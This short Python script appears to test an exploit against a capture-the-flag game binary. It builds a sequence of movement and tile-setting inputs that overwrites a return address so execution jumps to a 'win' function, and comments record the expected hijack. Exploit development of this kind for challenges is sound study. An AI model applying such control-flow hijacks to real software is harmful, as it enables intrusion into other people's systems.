import sys
from t import report

# Round 0 hijack test: lives boost, walk to (1,-51), set tile 0xfe, 'w' -> flat -51
# Expected: ret addr 0x0804992c -> 0x080499fe -> win(&level=1) -> no flag, main returns, exit 0
seq = (b'ss' + b'a'*8 + b'w'*5 + b'w' + b's' + b'a'*47 + b'l' + b'\xfe' + b'w')
print('len', len(seq))
s = report(seq, maxbytes=1200000)
print('tail:', repr(s[-300:]))
